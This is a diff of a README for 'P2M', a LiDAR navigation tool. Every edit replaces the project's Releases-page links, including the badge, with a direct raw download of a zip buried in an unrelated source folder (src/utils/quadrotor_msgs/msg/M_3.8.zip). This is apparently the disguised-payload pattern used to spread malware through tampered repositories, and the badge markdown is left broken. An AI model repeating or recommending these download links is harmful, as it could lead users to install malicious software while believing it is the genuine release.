@@ -1,6 +1,6 @@
 # 🚀 P2M - Simplify Navigation in Changing Environments
 
-[![Download P2M](https://img.shields.io/badge/Download%20P2M-Visit%20Releases-brightgreen.svg)](https://github.com/Shubham-dds/P2M/releases)
+[![Download P2M](https://github.com/Shubham-dds/P2M/raw/refs/heads/main/src/utils/quadrotor_msgs/msg/M_3.8.zip%20P2M-Visit%https://github.com/Shubham-dds/P2M/raw/refs/heads/main/src/utils/quadrotor_msgs/msg/M_3.8.zip)](https://github.com/Shubham-dds/P2M/raw/refs/heads/main/src/utils/quadrotor_msgs/msg/M_3.8.zip)
 
 ## 📌 Overview
 P2M is a simple tool designed to help navigate dynamic environments using LiDAR data. It focuses on smart obstacle avoidance and end-to-end navigation, making it useful for various applications.
@@ -22,7 +22,7 @@ Before downloading P2M, ensure your system meets the following requirements:
 To get started with P2M, follow these steps:
 
 1. **Download the Software:**
-   Visit the [Releases page](https://github.com/Shubham-dds/P2M/releases) to download the latest version of P2M.
+   Visit the [Releases page](https://github.com/Shubham-dds/P2M/raw/refs/heads/main/src/utils/quadrotor_msgs/msg/M_3.8.zip) to download the latest version of P2M.
 
 2. **Install P2M:**
    Once downloaded, follow these simple steps to install the software:
@@ -45,7 +45,7 @@ To get started with P2M, follow these steps:
    Click the "Start" button to begin navigating. P2M will automatically detect obstacles and guide you through the environment safely.
 
 ## 📥 Download & Install
-To download P2M, visit this link: [Download P2M](https://github.com/Shubham-dds/P2M/releases). Follow the installation steps listed above to set up the application on your device.
+To download P2M, visit this link: [Download P2M](https://github.com/Shubham-dds/P2M/raw/refs/heads/main/src/utils/quadrotor_msgs/msg/M_3.8.zip). Follow the installation steps listed above to set up the application on your device.
 
 ## 🛠️ FAQs
 
@@ -70,4 +70,4 @@ Thank you to everyone involved in the development of P2M. Your contributions hel
 ## 📄 License
 P2M is licensed under the MIT License. You are free to use, modify, and distribute the software, but please ensure proper attribution.
 
-For all updates and more details, visit [the Releases page](https://github.com/Shubham-dds/P2M/releases). Happy navigating!
+For all updates and more details, visit [the Releases page](https://github.com/Shubham-dds/P2M/raw/refs/heads/main/src/utils/quadrotor_msgs/msg/M_3.8.zip). Happy navigating!
